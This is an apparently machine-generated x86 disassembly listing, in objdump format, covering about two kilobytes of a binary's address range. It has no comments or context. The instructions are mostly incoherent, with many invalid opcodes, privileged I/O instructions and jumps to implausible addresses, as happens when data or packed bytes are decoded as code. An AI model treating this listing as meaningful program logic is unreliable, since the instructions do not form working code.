  404676:	sbb    eax,0xe1631858
  40467b:	adc    BYTE PTR fs:[ecx],cl
  40467e:	inc    esi
  40467f:	or     esp,DWORD PTR [ebp+0x9]
  404682:	into   
  404683:	adc    DWORD PTR [edx-0xe],ebx
  404686:	shr    BYTE PTR [edi+0x1],1
  404689:	sub    BYTE PTR [ebx-0x5fd8a408],al
  40468f:	fsub   st,st(5)
  404691:	adc    bl,bh
  404693:	pop    ds
  404694:	jbe    0x40469b
  404696:	mov    ebx,0x19f0bc1f
  40469b:	pop    ds
  40469c:	test   bl,dl
  40469e:	dec    edx
  40469f:	mov    ecx,0x70013ca8
  4046a4:	dec    ebx
  4046a5:	mov    eax,esp
  4046a7:	ins    DWORD PTR es:[edi],dx
  4046a8:	(bad)  
  4046a9:	sub    eax,0x39d63855
  4046ae:	mov    BYTE PTR [esp+ebx*1],0x1d
  4046b2:	les    ebx,FWORD PTR [ebx+0x1d]
  4046b5:	mov    bh,0xd
  4046b7:	cwde   
  4046b8:	and    dh,al
  4046ba:	add    esp,DWORD PTR [esi+eax*1]
  4046bd:	push   0x69bd1020
  4046c2:	sti    
  4046c3:	push   ecx
  4046c4:	xor    al,0x54
  4046c6:	cmc    
  4046c7:	pop    ebx
  4046c8:	or     BYTE PTR [ebp+0x28],0xb3
  4046cc:	aaa    
  4046cd:	js     0x404726
  4046cf:	adc    eax,0x833c48aa
  4046d4:	cmp    DWORD PTR [edx+0xc],ecx
  4046d7:	mov    edx,DWORD PTR [esp+ecx*1]
  4046da:	call   0x8b4a649e
  4046df:	sbb    edi,edi
  4046e1:	rcr    DWORD PTR [ebx-0xd],cl
  4046e4:	and    al,0x17
  4046e6:	xchg   ebx,eax
  4046e7:	dec    di
  4046e9:	imul   esp,DWORD PTR [esi],0xffffffb7
  4046ec:	or     esi,DWORD PTR [edx]
  4046ee:	add    eax,0x2153941c
  4046f3:	cld    
  4046f4:	push   0xe1940b6a
  4046f9:	into   
  4046fa:	jmp    0x4046b3
  4046fc:	add    eax,DWORD PTR [ecx+ecx*1+0x7d46ede2]
  404703:	clc    
  404704:	or     ch,bh
  404706:	fbld   TBYTE PTR [eax+0x45d75a1a]
  40470c:	or     eax,0x3cac095b
  404711:	and    eax,0x4b12f8d5
  404716:	pusha  
  404717:	stos   BYTE PTR es:[edi],al
  404718:	or     eax,0x2bf889f3
  40471d:	mov    bh,0x6d
  40471f:	loope  0x40470a
  404721:	ss mov al,0x69
  404724:	xchg   DWORD PTR [esi],edx
  404726:	bnd jmp 0x8987456c
  40472c:	pop    ds
  40472d:	jne    0x40472e
  40472f:	call   0x3d278cbc
  404734:	sub    eax,0xdc150575
  404739:	in     eax,0x67
  40473b:	add    ch,BYTE PTR [ebp-0x3d]
  40473e:	in     eax,dx
  40473f:	fnsave [esi+0x75]
  404742:	or     dl,BYTE PTR [edi]
  404744:	hlt    
  404745:	adc    bl,cl
  404747:	lods   al,BYTE PTR ds:[esi]
  404748:	jmp    0x40472b
  40474a:	or     eax,esp
  40474c:	mov    ebx,0x749b7d77
  404751:	in     eax,dx
  404752:	cmp    al,0x2e
  404754:	adc    eax,0xdc15b823
  404759:	mov    DWORD PTR [ebp-0x28],esi
  40475c:	mov    al,0xd1
  40475e:	(bad)  
  40475f:	adc    DWORD PTR [eax-0x74a5b599],ecx
  404765:	and    ecx,DWORD PTR [edi]
  404767:	jae    0x4046ff
  404769:	xchg   esi,eax
  40476a:	fdivr  DWORD PTR [esi+0x7d80db75]
  404770:	out    0x4a,eax
  404772:	or     cl,BYTE PTR [edx-0x692e938d]
  404778:	std    
  404779:	mov    al,0x3b
  40477b:	sbb    esp,DWORD PTR [edi+eax*4+0x20b00bd9]
  404782:	rep stos BYTE PTR es:[edi],al
  404784:	or     eax,0xdedc048f
  404789:	sbb    DWORD PTR [ebx+0xaf2f07d],eax
  40478f:	push   edx
  404790:	es data16 adc al,0x5a
  404794:	jno    0x404771
  404796:	mov    ch,0x2
  404798:	out    0x4e,eax
  40479a:	popf   
  40479b:	dec    cx
  40479d:	inc    esp
  40479e:	cmp    al,0x2a
  4047a0:	shr    DWORD PTR [edi],1
  4047a2:	(bad)  
  4047a3:	outs   dx,DWORD PTR ds:[esi]
  4047a4:	jno    0x4047e2
  4047a6:	xor    BYTE PTR [edx+0x3d],dh
  4047a9:	cmp    al,0x39
  4047ab:	ja     0x4047e6
  4047ad:	imul   ebx,ebx,0xdf302c88
  4047b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047b4:	imul   esi,DWORD PTR [ecx+edi*1+0x39114c0],0xffffffe4
  4047bc:	pop    eax
  4047bd:	daa    
  4047be:	pop    edx
  4047bf:	mov    ch,0x97
  4047c1:	or     al,0x11
  4047c3:	aaa    
  4047c4:	mov    eax,ds:0x7ff127f
  4047c9:	mov    ebp,0x7eb42850
  4047ce:	or     al,0x3d
  4047d0:	in     eax,0x70
  4047d2:	sbb    al,0xc3
  4047d4:	je     0x404773
  4047d6:	add    BYTE PTR [esi-0x34],bh
  4047d9:	test   cl,cl
  4047db:	ret    
  4047dc:	and    al,0xdf
  4047de:	mov    cl,al
  4047e0:	jb     0x404851
  4047e2:	je     0x40477a
  4047e4:	lods   eax,DWORD PTR ds:[esi]
  4047e5:	sbb    eax,0x645c5d28
  4047ea:	lea    esi,[esi+ebx*8]
  4047ed:	pop    ebx
  4047ee:	lds    edx,FWORD PTR [esi]
  4047f0:	fisttp DWORD PTR [ebx-0x7aa9b2fa]
  4047f6:	and    al,0x9e
  4047f8:	addr16 int 0xd6
  4047fb:	je     0x4047b4
  4047fd:	jne    0x404802
  4047ff:	push   0x3fb90706
  404804:	or     ebp,DWORD PTR [ecx+0x68]
  404807:	pusha  
  404808:	fldl2t 
  40480a:	call   0x8303:0xc717e76f
  404811:	xor    eax,0x23b166cd
  404816:	stos   DWORD PTR es:[edi],eax
  404817:	add    cl,BYTE PTR [esi+0x13]
  40481a:	xchg   DWORD PTR [edx+0x15],ebp
  40481d:	lahf   
  40481e:	jbe    0x404827
  404820:	shl    BYTE PTR [ecx],1
  404822:	scas   al,BYTE PTR es:[edi]
  404823:	imul   esi,DWORD PTR [edi-0x69],0x5ed8ff6c
  40482a:	int    0xd8
  40482c:	sub    ecx,edx
  40482e:	jo     0x40482c
  404830:	inc    esi
  404831:	cwde   
  404832:	lea    esi,[ebp-0x49]
  404835:	adc    bl,ah
  404837:	test   DWORD PTR [edi+0x29],edi
  40483a:	pop    eax
  40483b:	pop    ecx
  40483c:	cmp    DWORD PTR [eax-0x7bf0bb17],eax
  404842:	mov    al,ds:0xa35b49f6
  404847:	and    BYTE PTR [esi],dl
  404849:	pop    ebp
  40484a:	int    0xd
  40484c:	xchg   edx,eax
  40484d:	ins    DWORD PTR es:[edi],dx
  40484e:	mov    bl,0x8c
  404850:	cmp    al,0xa
  404852:	push   ebp
  404853:	test   bl,ch
  404855:	mov    bl,0x35
  404857:	mov    ds,WORD PTR [ebp+0x2ea799ad]
  40485d:	aaa    
  40485e:	adc    BYTE PTR ds:0x770f5fe,dh
  404864:	repnz inc eax
  404866:	lock cmc 
  404868:	loop   0x404877
  40486a:	push   ss
  40486b:	scas   al,BYTE PTR es:[edi]
  40486c:	call   0xb5a758e0
  404871:	cmp    cl,0x53
  404874:	jne    0x505b682e
  40487a:	xor    esi,DWORD PTR [esi]
  40487c:	ret    
  40487d:	push   cs
  40487e:	bound  esp,QWORD PTR [esi+0x30]
  404881:	jbe    0x404841
  404883:	je     0x4048c7
  404885:	stos   DWORD PTR es:[edi],eax
  404886:	pmaxsw mm5,QWORD PTR [edx+0x65]
  40488a:	out    dx,eax
  40488b:	jne    0x40487d
  40488d:	jmp    0x4048d9
  40488f:	pop    eax
  404890:	xor    ah,BYTE PTR [edi-0x7b]
  404893:	push   cs
  404894:	and    BYTE PTR [ecx-0x2a],al
  404897:	lods   al,BYTE PTR ds:[esi]
  404898:	(bad)  
  404899:	mov    ch,0x6e
  40489b:	pop    edi
  40489c:	adc    al,cl
  40489e:	jmp    0x4048dd
  4048a0:	mov    esi,0xeb5c2f35
  4048a5:	push   es
  4048a6:	mov    esp,0x76fc7503
  4048ab:	or     eax,0x211fc677
  4048b0:	cmp    ch,BYTE PTR [ebp+edx*8-0x1]
  4048b4:	(bad)  
  4048b5:	xor    dh,BYTE PTR [esi-0x545c4ad3]
  4048bb:	mov    DWORD PTR [esi],edi
  4048bd:	or     edi,DWORD PTR [ebx]
  4048bf:	add    eax,0x202b6a2d
  4048c4:	cmp    BYTE PTR [edx+0x6b59e56],dh
  4048ca:	icebp  
  4048cb:	cmp    ecx,DWORD PTR [ebp-0x24]
  4048ce:	ja     0x4048d4
  4048d0:	add    eax,0x58fee957
  4048d5:	pop    ebp
  4048d6:	leave  
  4048d7:	jno    0x404878
  4048d9:	lds    edx,FWORD PTR [ebx]
  4048db:	jecxz  0x40486d
  4048dd:	xor    BYTE PTR [ebx-0x49],cl
  4048e0:	hlt    
  4048e1:	dec    edi
  4048e2:	mov    ecx,edi
  4048e4:	mov    eax,0xc9501f5f
  4048e9:	xchg   DWORD PTR [edx-0x298d7628],edi
  4048ef:	repz jmp 0xede10062
  4048f5:	lods   eax,DWORD PTR ds:[esi]
  4048f6:	mov    bh,0x14
  4048f8:	add    dh,BYTE PTR [edi-0x624cc900]
  4048fe:	inc    edi
  4048ff:	je     0x40495e
  404901:	jle    0x4048fc
  404903:	in     eax,dx
  404904:	aas    
  404905:	mov    bl,0x1
  404907:	push   es
  404908:	inc    ebp
  404909:	je     0x404943
  40490b:	mov    bl,0x2
  40490d:	inc    esi
  40490e:	je     0x404922
  404910:	mov    bl,0x3
  404912:	dec    esi
  404913:	je     0x404922
  404915:	out    dx,al
  404916:	int    0xd6
  404918:	jp     0x404967
  40491a:	mov    dh,BYTE PTR ds:[ebx+0x3b12b804]
  404921:	sub    al,0x39
  404923:	xor    BYTE PTR [esi+0x76c2f03b],0x25
  40492a:	mov    edx,0x1b751bf9
  40492f:	retf   
  404930:	aaa    
  404931:	mov    al,ds:0x848f0e56
  404936:	stos   BYTE PTR es:[edi],al
  404937:	fdivr  QWORD PTR [edx-0x760b45f1]
  40493d:	add    ebp,DWORD PTR [ebx-0x4750ed08]
  404943:	(bad)  
  404945:	adc    esi,DWORD PTR [esi-0x688fe2be]
  40494b:	shl    DWORD PTR [edx],cl
  40494d:	iret   
  40494e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40494f:	sahf   
  404950:	imul   esi,DWORD PTR [edi+0x32046bd6],0x7c
  404957:	xchg   edi,eax
  404958:	ret    
  404959:	sbb    dl,ah
  40495b:	adc    bl,BYTE PTR [eax+0x659e270c]
  404961:	pop    eax
  404962:	jle    0x404933
  404964:	lahf   
  404965:	adc    DWORD PTR [esp+ecx*8+0x2f0c9308],eax
  40496c:	push   esi
  40496d:	icebp  
  40496e:	add    eax,0x60fa5c74
  404973:	sub    ah,bh
  404975:	push   0x20
  404977:	xchg   esi,eax
  404978:	mov    ecx,DWORD PTR [eax+0x38]
  40497b:	into   
  40497c:	or     al,0xa6
  40497e:	add    eax,0x3743a9d7
  404983:	add    edi,edx
  404985:	inc    eax
  404987:	add    eax,0x2066cad1
  40498c:	jns    0x40492f
  40498e:	dec    eax
  40498f:	mov    eax,0x3b39f403
  404994:	dec    esp
  404995:	inc    eax
  404996:	mov    bh,0x2b
  404998:	jp     0x404940
  40499a:	iret   
  40499b:	dec    ebx
  40499c:	add    BYTE PTR [edi+0x2a0c66d1],0x18
  4049a3:	(bad)  
  4049a4:	clc    
  4049a5:	mov    edi,0x17883d66
  4049aa:	xor    DWORD PTR [edx-0x61],esp
  4049ad:	adc    eax,0x365c823c
  4049b2:	nop
  4049b3:	aaa    
  4049b4:	ins    BYTE PTR es:[edi],dx
  4049b5:	adc    ebx,DWORD PTR [ebx+ebx*2+0x287ddf3d]
  4049bc:	push   cs
  4049bd:	ja     0x404954
  4049bf:	dec    ebx
  4049c0:	lds    ecx,FWORD PTR [ecx-0x8]
  4049c3:	dec    ebp
  4049c4:	inc    eax
  4049c5:	clc    
  4049c6:	out    dx,eax
  4049c7:	ins    DWORD PTR es:[edi],dx
  4049c8:	inc    eax
  4049c9:	out    dx,eax
  4049ca:	push   esp
  4049cb:	jnp    0x404a4c
  4049cd:	add    ecx,DWORD PTR [eax+edi*8]
  4049d0:	fistp  QWORD PTR [edx-0x4c1d87a]
  4049d6:	cwde   
  4049d7:	dec    eax
  4049d8:	cmp    edi,eax
  4049da:	jl     0x404a22
  4049dc:	jmp    0x404a10
  4049de:	add    ebx,ebx
  4049e0:	add    eax,DWORD PTR ss:[esi]
  4049e3:	sub    edx,ebp
  4049e5:	mov    BYTE PTR [edx+0x4e],0x58
  4049e9:	mov    al,0xaf
  4049eb:	add    eax,ebx
  4049ed:	push   es
  4049ee:	dec    eax
  4049ef:	cmp    ch,bh
  4049f1:	mov    cl,0x82
  4049f3:	out    dx,al
  4049f4:	jge    0x4049bd
  4049f6:	das    
  4049f7:	xlat   BYTE PTR ds:[ebx]
  4049f8:	mov    ecx,0x6c958d0f
  4049fd:	or     esp,eax
  4049ff:	dec    eax
  404a00:	je     0x404a12
  404a02:	iret   
  404a03:	cmp    bl,BYTE PTR [edi+0x4b]
  404a06:	adc    eax,0x8b6ade2a
  404a0b:	imul   BYTE PTR [edx-0x454844f8]
  404a11:	mov    ch,0x45
  404a13:	mov    DWORD PTR [edx],ecx
  404a15:	cmp    BYTE PTR [ebp+0x6],0xa8
  404a19:	neg    edx
  404a1b:	stos   DWORD PTR es:[edi],eax
  404a1c:	jg     0x404a07
  404a1e:	inc    esi
  404a1f:	inc    edx
  404a20:	or     ah,ah
  404a22:	mov    eax,0x92aae088
  404a27:	push   eax
  404a28:	mov    ebx,esp
  404a2a:	stos   DWORD PTR es:[edi],eax
  404a2b:	aad    0xbb
  404a2d:	push   0xffffffa0
  404a2f:	mov    dh,0x6
  404a31:	push   0x431388ae
  404a36:	dec    ecx
  404a37:	cmp    bh,0x6f
  404a3a:	shr    BYTE PTR [eax-0x1680af13],1
  404a40:	dec    ebx
  404a41:	mov    al,BYTE PTR [ebx]
  404a43:	stos   BYTE PTR es:[edi],al
  404a44:	cmp    ebx,esp
  404a46:	jne    0x404a40
  404a48:	pop    eax
  404a49:	pop    esi
  404a4a:	or     eax,0x979383db
  404a4f:	aam    0x71
  404a51:	cdq    
  404a52:	mov    al,ds:0xb9ab7fca
  404a57:	jl     0x404ab4
  404a59:	mov    eax,ds:0xfa7e07fb
  404a5e:	mov    eax,ds:0xf2e1e478
  404a63:	sub    eax,0xf37c0f9f
  404a68:	pop    es
  404a69:	jge    0x404a5d
  404a6b:	(bad)  
  404a6c:	mov    esi,0x51f8c786
  404a71:	push   ss
  404a72:	mov    eax,0x75000513
  404a77:	pop    ss
  404a78:	xchg   ebx,eax
  404a79:	addr16 mov ah,0x88
  404a7c:	or     esi,edi
  404a7e:	add    bh,BYTE PTR [ebp+0x38]
  404a81:	add    DWORD PTR [esi-0x3b],edi
  404a84:	xchg   BYTE PTR [ecx-0x74],ah
  404a87:	add    eax,0xaaa892d
  404a8c:	daa    
  404a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a8e:	or     ch,bh
  404a90:	dec    ebp
  404a91:	(bad)  
  404a92:	adc    BYTE PTR [edx],al
  404a94:	jb     0x404a99
  404a96:	out    dx,al
  404a97:	stc    
  404a98:	iret   
  404a99:	add    eax,esp
  404a9b:	test   BYTE PTR [ebp-0x382db93],0xf
  404aa2:	mov    bh,0xb
  404aa4:	sub    eax,0x1aefa509
  404aa9:	cmp    edi,DWORD PTR [edx]
  404aab:	jae    0x404ac7
  404aad:	sbb    dl,BYTE PTR [edi]
  404aaf:	ins    BYTE PTR es:[edi],dx
  404ab0:	add    ecx,DWORD PTR [ebp+0x5b1149b4]
  404ab6:	adc    BYTE PTR [edi-0x13079435],cl
  404abc:	mov    ecx,0xdd2da74d
  404ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ac2:	sbb    ebx,DWORD PTR [ebx]
  404ac4:	xor    dl,bh
  404ac6:	inc    edx
  404ac7:	pop    ebp
  404ac8:	adc    BYTE PTR [edi+0x1],bh
  404acb:	je     0x404ad1
  404acd:	add    al,0xee
  404acf:	(bad)  
  404ad0:	fcomi  st,st(6)
  404ad2:	ja     0x404add
  404ad4:	movsx  edi,WORD PTR [eax]
  404ad7:	cmp    ebx,DWORD PTR [edx+0x7e]
  404ada:	add    bh,BYTE PTR [ecx+0x2e9d1c8d]
  404ae0:	add    DWORD PTR [edx],0x3e4e36e
  404ae6:	pop    ebp
  404ae7:	dec    edi
  404ae8:	sbb    eax,DWORD PTR [esp+ecx*8]
  404aeb:	js     0x404aca
  404aed:	lods   eax,DWORD PTR ds:[esi]
  404aee:	jmp    0x404ad0
  404af0:	cld    
  404af1:	mov    gs,ecx
  404af3:	rcr    DWORD PTR fs:[edx],1
  404af6:	ins    BYTE PTR es:[edi],dx
  404af7:	adc    DWORD PTR [ebx],eax
  404af9:	ins    DWORD PTR es:[edi],dx
  404afa:	add    edi,esi
  404afc:	lahf   
  404afd:	xor    al,0xa4
  404aff:	ins    DWORD PTR es:[edi],dx
  404b00:	push   cs
  404b01:	dec    ecx
  404b02:	dec    esi
  404b03:	inc    esi
  404b04:	dec    esi
  404b05:	inc    ecx
  404b06:	dec    esi
  404b07:	lods   al,BYTE PTR ds:[esi]
  404b08:	or     cl,bh
  404b0a:	inc    edx
  404b0b:	and    DWORD PTR [eax-0x45],esp
  404b0e:	xor    BYTE PTR [esi-0x3d],cl
  404b11:	cdq    
  404b12:	(bad)  
  404b13:	mov    al,ds:0x5b854b38
  404b18:	in     al,dx
  404b19:	stos   BYTE PTR es:[edi],al
  404b1a:	ret    
  404b1b:	jle    0x404b77
  404b1d:	dec    ebp
  404b1e:	aam    0x34
  404b20:	pop    esi
  404b21:	or     al,0x5
  404b23:	fstp   QWORD PTR [edx]
  404b25:	(bad)  
  404b26:	jg     0x404b45
  404b28:	cmp    ecx,0xfffffffd
  404b2b:	jl     0x404b45
  404b2d:	sub    eax,0x80aa261a
  404b32:	rcr    BYTE PTR cs:[esi-0x48],1
  404b36:	add    eax,0xaa188a3a
  404b3b:	neg    ecx
  404b3d:	or     eax,0xee1aeb5a
  404b42:	out    dx,eax
  404b43:	mov    ebx,0x4542f591
  404b48:	je     0x404b61
  404b4a:	stos   BYTE PTR es:[edi],al
  404b4b:	loop   0x404b45
  404b4d:	pop    es
  404b4e:	adc    ecx,DWORD PTR [eax-0x1f15df3c]
  404b54:	ins    DWORD PTR es:[edi],dx
  404b55:	fbld   TBYTE PTR [esi-0x55]
  404b58:	or     eax,DWORD PTR [edi]
  404b5a:	and    eax,edi
  404b5c:	daa    
  404b5d:	push   ss
  404b5e:	add    al,0xf7
  404b60:	shr    DWORD PTR [ecx+eiz*4-0x26],cl
  404b64:	push   ds
  404b65:	pop    ebx
  404b66:	add    edx,edi
  404b68:	mov    ah,BYTE PTR [ebp+0x23]
  404b6b:	mov    ds,WORD PTR [ebp-0x54]
  404b6e:	or     esp,DWORD PTR [eax-0x4bc4f2b7]
  404b74:	sub    ebx,DWORD PTR [ebp+0x6d77dbee]
  404b7a:	imul   eax,DWORD PTR [esi+edi*2],0xffffffc9
  404b7e:	mov    al,0x45
  404b80:	mov    bl,BYTE PTR [ebp-0x15]
  404b83:	mov    edi,0x1d4ad455
  404b88:	ret    
  404b89:	outs   dx,DWORD PTR ds:[esi]
  404b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b8b:	fldcw  WORD PTR [edx-0x40]
  404b8e:	ss jb  0x404baf
  404b91:	cli    
  404b92:	adc    dh,BYTE PTR [edx+0x5]
  404b95:	mov    edx,0xd360f051
  404b9a:	mov    ebp,0xeb05939f
  404b9f:	sub    al,BYTE PTR [ecx]
  404ba1:	das    
  404ba2:	sub    eax,0xd757a051
  404ba7:	nop
  404ba8:	dec    eax
  404ba9:	scas   al,BYTE PTR es:[edi]
  404baa:	div    bl
  404bac:	mov    BYTE PTR [ebp-0x1c267683],dh
  404bb2:	inc    ebx
  404bb3:	push   esp
  404bb4:	ror    BYTE PTR [edi],0x4b
  404bb7:	jne    0x404bad
  404bb9:	(bad)  
  404bba:	cli    
  404bbb:	cmp    edx,edi
  404bbd:	fnsave [esi+0x56]
  404bc0:	in     eax,dx
  404bc1:	stos   BYTE PTR es:[edi],al
  404bc2:	sbb    ch,bl
  404bc4:	call   0xfdd6851
  404bc9:	add    DWORD PTR [edx-0x22ed09a0],ebp
  404bcf:	jecxz  0x404bda
  404bd1:	cmp    al,0x4a
  404bd3:	add    BYTE PTR [ecx+0x75],al
  404bd6:	stc    
  404bd7:	cs inc edx
  404bd9:	test   BYTE PTR [ebp-0x3c085123],ch
  404bdf:	dec    edx
  404be0:	jns    0x404bd5
  404be2:	jno    0x404bf4
  404be4:	push   DWORD PTR [esi-0x7]
  404be7:	or     BYTE PTR ss:0x40fb9f2,cl
  404bee:	cmp    bl,cl
  404bf0:	xchg   edi,eax
  404bf1:	mov    bl,cl
  404bf3:	add    bl,ch
  404bf5:	lea    ebx,[ebx+ebx*4+0xd0d578d]
  404bfc:	cmp    al,0x71
  404bfe:	bound  edi,QWORD PTR [ecx+0x41d63fd8]
  404c04:	mov    ebx,0x74403cf4
  404c09:	push   ds
  404c0a:	mov    ds:0x40eb243c,eax
  404c0f:	or     cl,BYTE PTR [edi+edx*4+0xcc3d2be]
  404c16:	aad    0x5e
  404c18:	xor    DWORD PTR [edx-0x1dbc835b],0x5a8d6d6c
  404c22:	call   0xee05:0xaf8584ee
  404c29:	test   BYTE PTR [esi-0x3f],0xc6
  404c2d:	imul   esp,DWORD PTR [edx+ebp*1],0x242a0040
  404c34:	add    al,0xbd
  404c36:	xor    eax,0xa9d12bb
  404c3b:	sub    ah,BYTE PTR [eax]
  404c3d:	sub    BYTE PTR [ecx+ebp*1],dl
  404c40:	inc    eax
  404c41:	sub    eax,0xfbf7667b
  404c46:	sbb    DWORD PTR [ebp*1+0x132d2a04],esp
  404c4d:	sub    ah,BYTE PTR [eax+ebp*1]
  404c50:	or     eax,0x5f75f7ba
  404c55:	add    al,0x24
  404c57:	adc    ebp,DWORD PTR ds:0x8372d2d
  404c5d:	sub    eax,0xf7b9ae9b
  404c62:	inc    eax
  404c63:	add    al,0x32
  404c65:	pop    es
  404c66:	sbb    BYTE PTR [eax],ch
  404c68:	sub    DWORD PTR [eax],ebp
  404c6a:	popf   
  404c6b:	xor    esp,DWORD PTR [esi+0x75]
  404c6e:	sbb    DWORD PTR [ecx],ebp
  404c70:	inc    eax
  404c71:	shl    eax,cl
  404c73:	xchg   BYTE PTR [ebx],ah
  404c75:	test   al,0x40
  404c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c78:	je     0x404c21
  404c7a:	fnstenv [ebp+0x77]
  404c7d:	ins    DWORD PTR es:[edi],dx
  404c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c7f:	popf   
  404c80:	outs   dx,DWORD PTR ds:[esi]
  404c81:	daa    
  404c82:	jmp    0x6e4a478b
  404c87:	add    eax,0x180ad02c
  404c8c:	inc    bx
  404c8e:	je     0x404cb5
  404c90:	adc    bh,ah
  404c92:	outs   dx,DWORD PTR ds:[esi]
  404c93:	jnp    0x404c1d
  404c95:	sar    BYTE PTR ds:0x66227506,cl
  404c9b:	test   DWORD PTR [esi+0x6],0xdc12345
  404ca2:	rcl    DWORD PTR [ecx],1
  404ca4:	ror    BYTE PTR [ecx],cl
  404ca6:	cmp    DWORD PTR [esi+0x53],0xc2bd2c03
  404cad:	lea    eax,[eax+0x19]
  404cb0:	mov    BYTE PTR [ebx+0x23],0x35
  404cb4:	jne    0x404ce4
  404cb6:	mov    edx,0xba683fab
  404cbb:	ret    0x10c0
  404cbe:	dec    ebp
  404cbf:	mov    al,bh
  404cc1:	adc    BYTE PTR [eax-0x15],al
  404cc4:	bound  ebx,QWORD PTR es:[eax-0x26080c44]
  404ccb:	loope  0x404d20
  404ccd:	frstor [esi+0x1d3a171d]
  404cd3:	sbb    cl,bl
  404cd5:	cld    
  404cd6:	jmp    0x74c4fcb6
  404cdb:	mov    ebp,DWORD PTR [edi-0x1]
  404cde:	pop    esp
  404cdf:	fcomp  st(1)
  404ce1:	fstsw  WORD PTR [ebp-0xa]
  404ce5:	fwait
  404ce6:	pop    ebx
  404ce7:	inc    ebp
  404ce8:	test   BYTE PTR [eax],0x41
  404ceb:	sub    ebx,edx
  404ced:	mov    bh,0xe3
  404cef:	mov    ebx,0xff99f6ff
  404cf4:	fbstp  TBYTE PTR cs:[ebp-0x18]
  404cf8:	lea    edi,[ebx+0x3]
  404cfb:	mov    edx,0x8a9b3c09
  404d00:	inc    esp
  404d01:	sub    ah,bh
  404d03:	dec    eax
  404d04:	inc    edx
  404d05:	jecxz  0x404cc6
  404d07:	inc    ecx
  404d08:	loope  0x404d0e
  404d0a:	and    ah,0xf
  404d0d:	add    ax,0x3030
  404d11:	sub    ebx,DWORD PTR [ebp-0x5225683c]
  404d17:	inc    esi
  404d18:	shr    BYTE PTR [edx+0x87d1244],0x79
  404d1f:	pop    es
  404d20:	jle    0x404d55
  404d22:	std    
  404d23:	push   ebx
  404d24:	clc    
  404d25:	outs   dx,BYTE PTR ds:[esi]
  404d26:	xor    BYTE PTR [ebx],bh
  404d28:	jge    0x404d36
  404d2a:	dec    esi
  404d2b:	add    al,0x83
  404d2d:	call   DWORD PTR [edx]
  404d2f:	jae    0x404d58
  404d31:	mov    edi,0x8d25f8b5
  404d36:	cmp    eax,DWORD PTR [ebx]
  404d38:	xor    eax,0x6fa2572
  404d3d:	add    BYTE PTR [edi+0x78],cl
  404d40:	or     eax,0xc4bf6efe
  404d45:	jae    0x404d4e
  404d47:	adc    cl,bh
  404d49:	in     eax,dx
  404d4a:	jmp    0x404d6b
  404d4c:	data16 (bad) 
  404d4e:	mov    al,0x31
  404d50:	add    ch,bh
  404d52:	or     eax,0xeb64eef6
  404d57:	adc    al,0xbf
  404d59:	popf   
  404d5a:	and    al,0x19
  404d5c:	and    BYTE PTR [eax],dh
  404d5e:	je     0x404d51
  404d60:	(bad)  
  404d62:	out    dx,al
  404d63:	mov    edx,0x880856fb
  404d68:	shr    dx,0x6d
  404d6c:	mov    DWORD PTR [ebx+edx*2],esi
  404d6f:	add    al,bl
  404d71:	rol    DWORD PTR [eax+0xf],1
  404d74:	mov    edx,0x3edee4a
  404d79:	call   0xda60c599
  404d7e:	movups xmm4,XMMWORD PTR [edi]
  404d81:	rcl    DWORD PTR [esi-0x46],0x9
  404d85:	shr    DWORD PTR [ebx-0xf923cb],1
  404d8b:	mov    bh,0x16
  404d8d:	dec    esp
  404d8e:	xchg   DWORD PTR [edi+0x5b],esp
  404d91:	mov    ds:0xeaf7685a,eax
  404d96:	fcmovb st,st(4)
  404d98:	test   BYTE PTR [eax],cl
  404d9a:	loope  0x404df7
  404d9c:	add    esp,eax
  404d9e:	or     edi,edi
  404da0:	jge    0x404d31
  404da2:	mov    al,BYTE PTR [esp+edi*2]
  404da5:	pop    ds
  404da6:	mov    edi,0x7ff63329
  404dab:	test   DWORD PTR [ecx+0x2d],0xda81a73e
  404db2:	mov    bl,0xb6
  404db4:	loopne 0x404dc3
  404db6:	jae    0x404daa
  404db8:	dec    ecx
  404db9:	add    eax,0x7b6ad20d
  404dbe:	add    DWORD PTR [ebp-0x1b981fdd],0xfa056ddf
  404dc8:	bound  eax,QWORD PTR [ebx+0x47]
  404dcb:	daa    
  404dcc:	push   0xffffffad
  404dce:	or     bl,BYTE PTR [esi]
  404dd0:	fidiv  DWORD PTR [ebp+ecx*1-0x2793d8e6]
  404dd7:	outs   dx,DWORD PTR ds:[esi]
  404dd8:	pop    ss
  404dd9:	pop    es
  404dda:	ficom  WORD PTR [ebp-0x53]
  404dde:	daa    
  404ddf:	or     eax,DWORD PTR [edi+0x290b0cb9]
  404de5:	jne    0x404e05
  404de7:	into   
  404de8:	popa   
  404de9:	(bad)  
  404dea:	(bad)  
  404dec:	and    al,0xf
  404dee:	jne    0x404e0f
  404df0:	dec    ecx
  404df1:	adc    al,0xeb
  404df3:	cmp    DWORD PTR [eax+0x1fbe04c8],ecx
  404df9:	pop    ebx
  404dfa:	fwait
  404dfb:	jnp    0x404e6b
  404dfd:	adc    BYTE PTR [eax],ah
  404dff:	push   es
  404e00:	and    edx,ebp
  404e02:	add    BYTE PTR [ebp-0x15a24492],cl
  404e08:	dec    esp
  404e09:	adc    eax,DWORD PTR [ebx]
  404e0b:	mov    bh,0xc6
  404e0d:	pop    es
  404e0e:	out    0x80,eax
  404e10:	aas    
  404e11:	jecxz  0x404e0a
  404e13:	mov    ebx,0x6e19b0ac
  404e18:	ficomp WORD PTR [edi]
  404e1a:	jmp    0x404e56
  404e1c:	fisttp DWORD PTR [eax-0x1d5b18f3]
  404e22:	ret    
  404e23:	adc    eax,0xc7082c22
  404e28:	and    BYTE PTR [eax],bl
  404e2a:	inc    ecx
  404e2b:	push   0xfffffff4
  404e2d:	shr    DWORD PTR [ebx],1
  404e2f:	js     0x404e12
  404e31:	push   ss
  404e32:	inc    ebx
  404e33:	pop    es
  404e34:	pop    ss
  404e35:	fstcw  WORD PTR [eax-0x65]
  404e39:	fnclex 
  404e3b:	cld    
  404e3c:	or     eax,0x417d80ef
  404e41:	ins    BYTE PTR es:[edi],dx
  404e42:	fldz   
  404e44:	shl    DWORD PTR [eax-0x45],cl
  404e47:	mov    bh,BYTE PTR [esi]
  404e49:	cmp    bh,0x2b
  404e4c:	cli    
  404e4d:	mov    esi,0x4d66b50
  404e52:	jl     0x404e55
